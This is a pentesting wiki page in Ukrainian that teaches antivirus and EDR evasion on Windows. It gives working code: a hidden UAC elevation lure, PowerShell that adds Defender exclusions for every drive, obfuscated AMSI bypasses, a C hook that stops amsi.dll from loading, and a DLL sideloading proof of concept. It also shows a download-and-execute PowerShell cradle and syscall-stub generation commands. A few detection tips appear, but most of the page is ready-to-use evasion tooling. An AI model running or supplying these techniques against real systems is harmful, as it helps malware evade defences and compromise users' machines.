# Обхід антивірусу (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, що маскується під інший AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка UAC у стилі інсталятора перед втручанням у роботу Defender

Публічні loaders, що маскуються під чити для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe, які спочатку **запитують у користувача підвищення прав**, а вже потім нейтралізують Defender. Процес простий:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда виконується успішно лише за наявності в користувача прав адміністратора, тож помилка означає, що loader працює від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит UAC на підтвердження, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви й без того вважають, що встановлюють «зламане» програмне забезпечення, тому зазвичай погоджуються із запитом, надаючи malware потрібні права для зміни політики Defender.<sup>[[26]](#references)</sup>

### Загальні виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв ланцюжки на кшталт GachiLoader створюють якомога більше сліпих зон у Defender, а не вимикають службу повністю. Спочатку loader примусово завершує процес графічного watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, щоб жоден профіль користувача, системний каталог чи знімний диск не сканувався:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ключові спостереження:

- Цикл проходить по всіх змонтованих файлових системах (D:\, E:\, USB-накопичувачах тощо), тож **будь-яке майбутнє payload, записане будь-де на диску, ігноруватиметься**.
- Виключення розширення `.sys` розраховане на майбутнє — зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не торкаючись Defender знову.
- Усі зміни вносяться до `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу наступним етапам перевірити, чи збереглися виключення, або розширити їх без повторного виклику UAC.

Оскільки жодна служба Defender не зупиняється, наївні перевірки працездатності й далі повідомляють, що «антивірус активний», хоча перевірка в реальному часі не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія AV Evasion**

Наразі AV використовують різні методи перевірки файлів на шкідливість: статичне виявлення, динамічний аналіз, а в просунутіших EDR — поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює шляхом пошуку відомих шкідливих рядків або послідовностей байтів у бінарному файлі чи скрипті, а також вилучення інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, цифрових підписів, значка, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, уже проаналізували та позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати й запустити її в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб AV його не виявив, але залежно від того, що саме ви намагаєтеся обфускувати, це може забрати багато часу.

- **Власні інструменти**

Якщо розробити власні інструменти, для них не буде відомих шкідливих сигнатур, але це потребує багато часу й зусиль.

> [!TIP]
> Для перевірки на статичне виявлення Windows Defender добре підійде [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів і просить Defender просканувати кожен окремо, щоб визначити, які саме рядки чи байти у вашому бінарному файлі позначено.

Наполегливо рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### Офлайн-тести PE-ознак для статичних класифікаторів

Байти упакованого чи зашифрованого payload — лише один із чинників, які враховує статичний класифікатор. EMBER2024 виділяє PE-ознаки, зокрема імпорти, експорти, секції, заголовки та дані Authenticode.<sup>[[48]](#references)</sup> В одному експерименті з loader додавання 141 імпорту, що виглядав нешкідливим, знизило оцінку шкідливості EMBER2024 на 93%, тоді як пов’язані зі шкідливим ПЗ імпорти її підвищили. Цей результат стосується саме цієї моделі та цих зразків і не є надійним способом обійти конкретний продукт AV/EDR.<sup>[[50]](#references)</sup>

Для авторизованого тестування loader залишайте payload і шлях виконання незмінними, змінюйте лише одну заплановану змінну збірки для кожного варіанта й порівнюйте оцінки офлайн. Перевіряйте отримані PE-ознаки, оскільки зміна збірки може вплинути на кілька груп ознак.<sup>[[49]](#references)[[50]](#references)</sup> Щоб потрібні імпорти залишалися в IAT, викликайте вибрані Win32 API з досяжного коду. Змінюйте вибір і розподіляйте місця виклику між збірками, а не створюйте фіксовану функцію маскування, яка може стати сигнатурою. В експерименті також повідомлялося про нижчі оцінки за наявності дійсного підпису коду, записів експорту й більшої кількості функцій, що збільшують `.pdata`; недійсний підпис майже не вплинув на оцінку, а ефект `.pdata` був невеликим.<sup>[[50]](#references)</sup>

Пакет `thrember` надає засоби для виділення ознак і еталонні моделі. Після його встановлення виконайте `thrember.download_models("models")` із наявною директорією `models`, а потім запустіть оцінювач із батьківської директорії: допоміжна функція завантаження змінює поточну робочу директорію. PE-класифікатор може оцінювати директорію зі збірками, не надсилаючи їх до сервісу сканування:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Під час порівняння не змінюйте версії моделі та екстрактора ознак. Нижчий офлайн-показник свідчить лише про реакцію цього класифікатора на змінений бінарний файл; він не доводить ухилення від поведінкового аналізу, емуляції чи іншої моделі постачальника.<sup>[[49]](#references)[[50]](#references)</sup> Про [поліморфізм для кожного збирання та маскування зовнішнього бінарного файла у віртуалізованих payload](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) дивіться в окремій моделі виконання.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі з вашого браузера, створенням minidump LSASS тощо). Із цим може бути трохи складніше працювати, але ось кілька способів обійти sandbox.

- **Затримка перед виконанням** Залежно від реалізації, це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на перевірку файлів, щоб не переривати роботу користувача, тому тривалі затримки можуть завадити аналізу бінарних файлів. Проблема в тому, що багато sandbox в AV можуть просто пропускати затримку — залежно від того, як її реалізовано.
- **Перевірка ресурсів комп’ютера** Зазвичай sandbox мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони можуть сповільнити комп’ютер користувача. Тут також можна проявити винахідливість: наприклад, перевіряти температуру CPU або навіть швидкість вентиляторів — у sandbox може бути реалізовано не все.
- **Перевірки, специфічні для комп’ютера** Якщо ви хочете націлитися на користувача, чия робоча станція приєднана до домену "contoso.local", перевірте домен комп’ютера та порівняйте його із заданим. Якщо він не збігається, програма може завершити роботу.

Виявляється, ім’я комп’ютера в sandbox Microsoft Defender — HAL9TH. Тож перед детонацією можна перевірити ім’я комп’ютера у своєму malware: якщо це HAL9TH, отже, ви всередині sandbox Defender, і програму можна завершити.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька чудових порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже зазначали в цій статті, **публічні інструменти** рано чи пізно **виявлятимуть**, тож поставте собі запитання:

Наприклад, якщо ви хочете зробити dump LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна скористатися іншим, менш відомим проєктом, який також робить dump LSASS?

Найімовірніше, правильна відповідь — другий варіант. На прикладі mimikatz: його, мабуть, найчастіше позначають як malware серед усіх інструментів в AV та EDR. Хоч сам проєкт і дуже крутий, обійти з його допомогою AV — справжній головний біль. Тож шукайте альтернативи для досягнення своєї мети.

> [!TIP]
> Змінюючи payload для ухилення від виявлення, обов’язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ФАЙЛ НА VIRUSTOTAL**, якщо прагнете забезпечити ухилення в довгостроковій перспективі. Щоб перевірити, чи виявляє ваш payload певний AV, встановіть його на VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, для ухилення від виявлення завжди **надавайте перевагу DLL**. З мого досвіду, файли DLL зазвичай **значно рідше виявляють** і аналізують, тож у деяких випадках це дуже простий спосіб уникнути виявлення (якщо ваш payload можна запускати як DLL, звісно).

Як видно на цьому зображенні, рівень виявлення DLL payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Порівняння на antiscan.me звичайного Havoc EXE payload зі звичайним Havoc DLL</p></figcaption></figure>

Тепер розглянемо кілька прийомів роботи з DLL, які допоможуть зробити їх значно непомітнішими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, яким керується loader, розміщуючи вразливу програму та шкідливі payload поруч.

Знайти програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого powershell-скрипта:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у "C:\Program Files\\" , вразливих до DLL hijacking, а також DLL-файлів, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно дослідити програми, вразливі до DLL Hijacking/Sideloading**. За належного виконання ця техніка доволі непомітна, але якщо ви використовуватимете загальновідомі програми, вразливі до DLL Sideloading, вас можуть легко викрити.

Якщо просто розмістити шкідливу DLL з назвою, яку програма очікує завантажити, ваш payload не завантажиться, оскільки програма очікує наявності в цій DLL певних функцій. Щоб розв’язати цю проблему, ми скористаємося іншою технікою під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма робить до проксі-DLL (шкідливої), до оригінальної DLL, зберігаючи таким чином функціональність програми та даючи змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/).

Ось кроки, яких я дотримувався:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і перейменовану оригінальну DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn), і proxy DLL мають рівень виявлення 0/26 на [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Наполегливо рекомендую** переглянути [запис трансляції S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб докладніше дізнатися про те, що ми обговорювали.

### Зловживання переспрямованими експортами (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarders»: замість вказівки на код запис експорту містить рядок ASCII у форматі `TargetDll.TargetFunc`. Коли викликач розв’язує експорт, завантажувач Windows:

- Завантажує `TargetDll`, якщо він ще не завантажений
- Розв’язує в ньому `TargetFunc`

Важливо розуміти такі особливості:
- Якщо `TargetDll` є KnownDLL, він надається із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає каталог модуля, що виконує переспрямування.

Це створює примітив непрямого sideloading: знайдіть підписану DLL, яка експортує функцію, переспрямовану до модуля, що не є KnownDLL, а потім розмістіть цю підписану DLL поруч із DLL під контролем зловмисника, названою точно так само, як цільовий модуль переспрямування. Коли викликається переспрямований експорт, завантажувач розв’язує переспрямування та завантажує вашу DLL із того самого каталогу, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому його пошук відбувається у звичайному порядку.

PoC (скопіюйте й вставте):
1) Скопіюйте підписану системну DLL до папки, доступної для запису.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливу `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної `DllMain`; щоб запустити `DllMain`, не потрібно реалізовувати функцію, на яку переспрямовується виклик.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Запустіть пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) завантажує side-by-side `keyiso.dll` (signed)
- Під час пошуку `KeyIsoSetAuditingInterface` loader переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім loader завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" з’явиться лише після виконання `DllMain`

Hunting tips:
- Зосередьтеся на forwarded exports, у яких цільовий модуль не є KnownDLL. KnownDLLs перелічено в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Перелічити forwarded exports можна за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте список форвардерів Windows 11, щоб знайти відповідні варіанти: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), що завантажують підписані DLL із несистемних шляхів, а потім завантажують із тієї самої директорії DLL, яких немає в KnownDLLs, із таким самим базовим ім’ям
- Створюйте сповіщення про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → несистемний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в директоріях програм

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це набір інструментів для payload, призначений для обходу EDR за допомогою призупинених процесів, прямих системних викликів і альтернативних методів виконання`

За допомогою Freeze можна приховано завантажувати та виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це постійна гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тож ніколи не покладайтеся лише на один інструмент; якщо можливо, спробуйте поєднувати кілька технік evasion.

## Прямі/непрямі Syscalls і визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user-mode** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **прямі** або **непрямі** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у kernel mode, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додати інструкцію `syscall`/`sysenter`/`SVC #0` до згенерованого stub (не звертаючись до export у `ntdll`).
- **Indirect**: перейти до наявного `syscall` gadget усередині `ntdll`, щоб здавалося, що перехід у kernel mode походить від `ntdll` (корисно для evasion на основі евристик); **randomized indirect** вибирає gadget із пулу для кожного виклику.
- **Egg-hunt**: уникнути вбудовування статичної послідовності opcode `0F 05` у файл; знайти syscall sequence під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall stubs за віртуальними адресами, а не читаючи байти stubs.
- **SyscallsFromDisk**: зіставити чистий `\KnownDlls\ntdll.dll`, прочитати SSN з його `.text`, а потім скасувати зіставлення (обходить усі hooks у пам’яті).
- **RecycledGate**: поєднати визначення SSN шляхом сортування за VA з перевіркою opcode, якщо stub чистий; якщо він hooked, перейти до визначення через VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і скористатися VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи hooked байти.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Інтерфейс сканування на наявність шкідливого ПЗ)

AMSI створили для запобігання "[безфайловому шкідливому ПЗ](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якщо вдавалося виконати payload **безпосередньо в пам’яті**, AV не міг цьому запобігти, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення прав EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне виконання коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- Макроси Office VBA

Вона дає змогу антивірусним рішенням перевіряти поведінку скриптів, надаючи вміст скриптів у незашифрованому та необфускованому вигляді.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` викличе таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу: спочатку додається `amsi:`, а потім шлях до виконуваного файлу, з якого запущено скрипт — у цьому випадку powershell.exe.

Ми не записали жодного файлу на диск, але все одно були виявлені в пам’яті завдяки AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також перевіряється через AMSI. Це стосується навіть `Assembly.Load(byte[])`, який завантажує код для виконання в пам’яті. Тому для виконання в пам’яті та обходу AMSI рекомендується використовувати старіші версії .NET (наприклад, 4.7.2 або нижчі).

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI переважно використовує статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може допомогти уникнути виявлення.

Однак AMSI здатна деобфускувати скрипти навіть із кількома шарами обфускації, тож залежно від способу виконання обфускація може бути невдалим варіантом. Через це обхід не такий простий. Хоча іноді достатньо змінити кілька назв змінних — усе залежить від того, наскільки щось позначено як підозріле.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її можна легко підмінити навіть без привілеїв. Через цю ваду реалізації AMSI дослідники знайшли кілька способів обходу сканування AMSI.

**Forcing an Error**

Якщо змусити ініціалізацію AMSI завершитися помилкою (amsiInitFailed), для поточного процесу сканування не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти широкому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Щоб зробити AMSI непридатним для використання в поточному процесі PowerShell, знадобився лише один рядок коду PowerShell. Звісно, сам AMSI позначає цей рядок, тож для використання цієї техніки потрібні певні зміни.

Ось модифікований обхід AMSI, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, що цей допис, імовірно, позначать після публікації, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (відповідальної за сканування введених користувачем даних) і перезаписі її інструкціями для повернення коду E_INVALIDARG. Таким чином результат фактичного сканування буде 0, що інтерпретується як чистий результат.

> [!TIP]
> Прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для докладнішого пояснення.

Також існує багато інших технік обходу AMSI за допомогою powershell. Щоб дізнатися про них більше, перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**цей репозиторій**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний, незалежний від мови програмування спосіб обходу — встановити user-mode hook на `ntdll!LdrLoadDll`, який повертатиме помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і в цьому процесі сканування не відбувається.<sup>[[23]](#references)</sup>

Загальний опис реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює з PowerShell, WScript/CScript і власними лоадерами (усім, що інакше завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Використовується лоадерами, запущеними через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає сигнатурного виявлення завдяки рандомізованим користувацьким функціям, змінним і виразам із символів, а також випадковому змінюванню регістру символів у ключових словах PowerShell.

**Видаліть виявлену сигнатуру**

Щоб видалити виявлену сигнатуру AMSI з пам’яті поточного процесу, можна скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без сканування AMSI. Це можна зробити так:

```bash
powershell.exe -version 2
```

## Журналювання PS

Журналювання PowerShell — це функція, що дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту та усунення несправностей, але водночас може **завадити зловмисникам, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими методами:

- **Вимкнути транскрибування PowerShell і журналювання модулів**: для цього можна скористатися таким інструментом, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використати PowerShell версії 2, AMSI не завантажиться, тож скрипти можна запускати без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (цей підхід використовує `powerpick` у Cobalt Strike). Це дає змогу обходити засоби контролю, прив’язані безпосередньо до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи інші засоби захисту PowerShell. Рівень захисту залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> Деякі методи обфускації передбачають шифрування даних, що збільшує ентропію бінарного файла й полегшує його виявлення антивірусами та EDR. Будьте обережні: за потреби шифруйте лише окремі фрагменти коду, які є чутливими або потребують приховування.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

Під час аналізу шкідливого ПЗ, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, які блокують декомпілятори та пісочниці. Наведений нижче процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від втручання — ConfuserEx шифрує кожне *тіло методу* й розшифровує його в статичному конструкторі *модуля* (`<Module>.cctor`). Він також змінює контрольну суму PE, тому будь-яка модифікація призведе до аварійного завершення бінарного файла. Скористайтеся **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі й переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output містить 6 параметрів захисту від втручання (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / потоку керування – передайте *очищений* файл до **de4dot-cex** (форку de4dot з підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Параметри:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує сплющення потоку керування, відновить оригінальні простори імен, класи та назви змінних і розшифрує рядки-константи.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів легковаговими обгортками (так званими *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні API .NET, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення — запустіть отриманий бінарний файл у dnSpy і знайдіть великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб виявити *справжній* payload.  Часто malware зберігає його як TLV-кодований масив байтів, ініціалізований у `<Module>.byte_0`.

